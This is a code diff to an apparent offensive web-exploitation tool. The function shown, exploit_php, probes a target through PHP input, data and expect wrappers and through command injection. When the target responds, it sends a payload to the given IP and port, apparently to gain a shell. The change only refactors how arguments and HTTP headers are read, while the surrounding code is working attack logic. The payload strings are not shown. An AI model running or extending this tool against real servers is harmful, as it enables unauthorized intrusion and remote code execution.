@@ -2,7 +2,7 @@
 from src.httpreqs import request
 from src.configs import config
 from src.utils.encodings import encode
-from src.utils.arguments import args
+from src.utils.arguments import ArgumentHandler
 from src.attacks.logPoison import exploit_log_poison
 from src.utils.info import printInfo
 from src.utils import colors
@@ -10,6 +10,7 @@ from src.utils import colors
 
 def exploit_php(exploit, method, ip, port):
     """Exploit PHP"""
+    args = ArgumentHandler()
     url = exploit["GETVAL"]
     post = exploit["POSTVAL"]
 
@@ -23,13 +24,13 @@ def exploit_php(exploit, method, ip, port):
     if method == "INPUT":
         u = url.replace(config.tempArg, encode(phpTest))
         res, _ = request.REQUEST(
-            u, args.httpheaders, exploit["POSTVAL"], config.proxies, "", ""
+            u, args.args['httpheaders'], exploit["POSTVAL"], config.proxies, "", ""
         )
         if "/bin" in res.text and "/php" in res.text:
             printInfo(ip, port, "PHP", "input wrapper")
             request.REQUEST(
                 url.replace(config.tempArg, encode(phpPayload)),
-                args.httpheaders,
+                args.args['httpheaders'],
                 exploit["POSTVAL"],
                 config.proxies,
                 "",
@@ -37,10 +38,10 @@ def exploit_php(exploit, method, ip, port):
             )
 
     if method == "DATA":
-        if args.mode == "post":
+        if args.args['mode'] == "post":
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(phpTest)),
-                args.httpheaders,
+                args.args['httpheaders'],
                 post,
                 config.proxies,
                 "",
@@ -49,7 +50,7 @@ def exploit_php(exploit, method, ip, port):
         else:
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(phpTest)),
-                args.httpheaders,
+                args.args['httpheaders'],
                 "",
                 config.proxies,
                 "",
@@ -57,10 +58,10 @@ def exploit_php(exploit, method, ip, port):
             )
         if "/bin" in res.text and "/php" in res.text:
             printInfo(ip, port, "PHP", "data wrapper")
-            if args.mode == "post":
+            if args.args['mode'] == "post":
                 request.REQUEST(
                     url.replace(config.tempArg, encode(phpPayload)),
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     post,
                     config.proxies,
                     "",
@@ -69,7 +70,7 @@ def exploit_php(exploit, method, ip, port):
             else:
                 request.REQUEST(
                     url.replace(config.tempArg, encode(phpPayload)),
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     "",
                     config.proxies,
                     "",
@@ -77,10 +78,10 @@ def exploit_php(exploit, method, ip, port):
                 )
 
     if method == "EXPECT":
-        if args.mode == "post":
+        if args.args['mode'] == "post":
             res, _ = request.REQUEST(
                 url,
-                args.httpheaders,
+                args.args['httpheaders'],
                 post.replace(config.tempArg, encode(phpTest)),
                 config.proxies,
                 "",
@@ -89,7 +90,7 @@ def exploit_php(exploit, method, ip, port):
         else:
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(phpTest)),
-                args.httpheaders,
+                args.args['httpheaders'],
                 "",
                 config.proxies,
                 "",
@@ -97,10 +98,10 @@ def exploit_php(exploit, method, ip, port):
             )
         if "/bin" in res.text and "/php" in res.text:
             printInfo(ip, port, "PHP", "expect wrapper")
-            if args.mode == "post":
+            if args.args['mode'] == "post":
                 request.REQUEST(
                     url,
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     post.replace(config.tempArg, encode(phpPayload)),
                     config.proxies,
                     "",
@@ -109,7 +110,7 @@ def exploit_php(exploit, method, ip, port):
             else:
                 request.REQUEST(
                     url.replace(config.tempArg, encode(phpPayload)),
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     "",
                     config.proxies,
                     "",
@@ -122,10 +123,10 @@ def exploit_php(exploit, method, ip, port):
         )
 
     if method == "CMD":
-        if args.mode == "post":
+        if args.args['mode'] == "post":
             res, _ = request.REQUEST(
                 url,
-                args.httpheaders,
+                args.args['httpheaders'],
                 post.replace(config.tempArg, encode(phpTest)),
                 config.proxies,
                 "",
@@ -134,7 +135,7 @@ def exploit_php(exploit, method, ip, port):
         else:
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(phpTest)),
-                args.httpheaders,
+                args.args['httpheaders'],
                 "",
                 config.proxies,
                 "",
@@ -142,10 +143,10 @@ def exploit_php(exploit, method, ip, port):
             )
         if "/bin" in res.text and "/php" in res.text:
             printInfo(ip, port, "php", "command injection")
-            if args.mode == "post":
+            if args.args['mode'] == "post":
                 request.REQUEST(
                     url,
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     post.replace(config.tempArg, encode(phpPayload)),
                     config.proxies,
                     "",
@@ -154,7 +155,7 @@ def exploit_php(exploit, method, ip, port):
             else:
                 request.REQUEST(
                     url.replace(config.tempArg, encode(phpPayload)),
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     "",
                     config.proxies,
                     "",
